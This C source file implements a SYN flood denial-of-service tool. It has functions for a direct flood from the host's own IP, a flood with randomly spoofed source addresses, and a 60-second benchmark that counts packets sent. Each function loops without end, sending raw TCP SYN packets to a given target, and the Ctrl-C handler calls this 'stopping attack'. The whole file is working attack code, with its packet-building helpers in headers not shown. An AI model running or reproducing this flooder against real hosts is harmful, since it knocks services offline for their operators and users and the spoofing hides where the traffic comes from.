#include "../include/SYNflooding.h"
#include "../include/iputils.h"


int PACKETS_SENT = 0;

void signal_handler(int sig){
    printf("Ctrl-C detected, stopping attack\n");
    printf("Sent a total of %i packets to target\n", PACKETS_SENT);
    PACKETS_SENT = 0;
    exit(0);
}

void syn_flooding_direct(const char* destination_address){
    signal(SIGINT, signal_handler);

    //We first get host's IP
    char host [256];
    struct in_addr in;
    gethostname(host, 256);
    struct hostent *host_ip;
    host_ip = gethostbyname(host);
    if(host_ip == NULL){
        perror("ERROR getting host IP");
        exit(1);
    }
    memcpy(&in.s_addr, *(host_ip->h_addr_list), sizeof(in.s_addr));

    packet_t packet = build_standard_packet(8080, 8080, inet_ntoa(in), destination_address, 4096, "SYN");
    set_TCP_flags(packet, 0x02);

    while(1){
        if (rawsocket_send(packet)<0){
            perror("ERROR sending the packet");
            exit(1);
        }
        PACKETS_SENT++;
    }

}

void syn_flooding_spoofed(const char* destination_address){
    signal(SIGINT, signal_handler);

    const char* address = generate_random_address();
    while(1){
        packet_t packet = build_standard_packet(8080, 8080, address, destination_address, 4096, "SYN");
        set_TCP_flags(packet, 0x02);
        if (rawsocket_send(packet)<0){
            perror("ERROR sending the packet");
            exit(1);
        }
        packet_destroy(packet);
        free((void*)address);
        address = generate_random_address();
        PACKETS_SENT++;
    }
    
}

void benchmark_syn_flooding_spoofed(const char* destination_address){
    time_t start, end;
    double elapsedTime;
    start = time(NULL);
    int terminate = 1;
    PACKETS_SENT = 0;

    signal(SIGINT, signal_handler);
    const char* address = generate_random_address();
    packet_t packet;

    while (terminate) {
        end = time(NULL);
        elapsedTime = difftime(end, start);
        if (elapsedTime >= 60.0) terminate = 0;
        else {
            packet = build_standard_packet(8080, 8080, address, destination_address, 4096, "SYN");
            set_TCP_flags(packet, 0x02);
            if (rawsocket_send(packet)<0){
                perror("ERROR sending the packet");
                exit(1);
            }
            packet_destroy(packet);
            free((void*)address);
            address = generate_random_address();
            PACKETS_SENT++;
        }
    }

    printf("Benchmark result: %i packets, %d packets/second\n", PACKETS_SENT, PACKETS_SENT/60);

}